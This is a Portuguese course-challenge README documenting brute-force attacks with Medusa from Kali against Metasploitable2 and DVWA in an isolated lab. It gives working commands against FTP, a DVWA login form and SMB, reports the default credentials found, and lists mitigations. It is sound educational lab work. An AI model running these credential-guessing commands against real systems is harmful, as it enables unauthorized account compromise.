# Desafio 01 DIO - kali + medusa

**Autor:** CHRISTIE SOARES WALDEMAR  
**Data:** 28/10/2025

Este projeto serve para simulação de ataques de força bruta em ambiente controlado (Kali + Metasploitable2/DVWA) usando Medusa. O repositório contém documentação passo-a-passo, wordlists de exemplo e inclui testes em servidor FTP, DVWA (formulário WEB) e SMB, coletando evidências (screenshots), tambem propondo medidas de mitigação.

✅ 1. Objetivo
- Explorar ataques de força bruta em diferentes serviços.
- Utilizar Kali Linux e Medusa para auditoria de segurança.
- Documentar comandos, resultados e recomendações.
- Compartilhar aprendizado em um repositório público.

---

✅ 2. Ambiente Configurado
- **VirtualBox** com duas VMs:
  - **Kali Linux**: IP `192.168.56.101`
  - **Metasploitable 2**: IP `192.168.56.102`
- Rede: **Host-Only**
- Serviços vulneráveis:
  - FTP (vsftpd)
  - DVWA (Web)
  - SMB

Print exemplo:

(images/ambiente.png)

---

✅ 3. Ferramentas Utilizadas
- Kali Linux
- Medusa
- Metasploitable 2
- DVWA (Damn Vulnerable Web App)
- Wordlists personalizadas

---

✅ 4. Ataques Realizados
- Os codigos executados nos ataques FTP, DVWA e SMB estão organizados na pasta cenário devidamentes agrupadas nas respectivas subpastas (ftp,smb,web-dvwa).

### **4.1 FTP - Força Bruta**
Comando:
```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/ftp.txt -M ftp
```
- `-h`: Host alvo
- `-u`: Usuário
- `-P`: Wordlist
- `-M`: Módulo (ftp)

**Print exemplo:**
```
(images/ftp-attack.png)
```

---

### **4.2 DVWA - Login Web**
Comando:
```bash
medusa -h 192.168.56.102 -u admin -P wordlists/web.txt -M http -m FORM:"/dvwa/login.php" -m DENY:"Login failed"
```

**Print exemplo:**
```
(images/dvwa-attack.png)
```

---

### **4.3 SMB - Password Spraying**
Comando:
```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt
```

**Print exemplo:**
```
(images/smb-attack.png)
```

---

✅ 5. Resultados**
- FTP: Credenciais encontradas → `msfadmin:msfadmin`
- DVWA: Login bem-sucedido com senha fraca.
- SMB: Usuário válido identificado.

**Print exemplo:**
```
(images/resultados.png)
```

---

✅ 6. Medidas de Mitigação**
- Políticas de senha forte (mínimo 12 caracteres, complexidade).
- Bloqueio após tentativas falhas.
- CAPTCHA em formulários.
- Monitoramento de logs e alertas.
- Segmentação de rede e restrição de serviços.

---

## ✅ **7. Estrutura do Repositório**
```
/projeto-medusa
    /images        # Capturas de tela
    /wordlists     # Listas de senhas e usuários
    /scenarios       # Scenarios de ataques dividos
    README.md      # Documentação principal
    LICENSE
    LICENSE_PT-BR

```

---

✅ 9. Referências**
- [Kali Linux](https://www.kali.org/)
- [Medusa Tool](https://tools.kali.org/password-attacks/medusa)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [DVWA](https://github.com/digininja/DVWA)


Observação: testes realizados exclusivamente em ambiente isolado para fins educativos e o Desafio DIO.
## Licença
Este projeto está licenciado sob os termos da [Licença MIT](./LICENSE).  
Tradução para o português disponível em [LICENSE_PT-BR.md](./LICENSE_PT-BR.md).
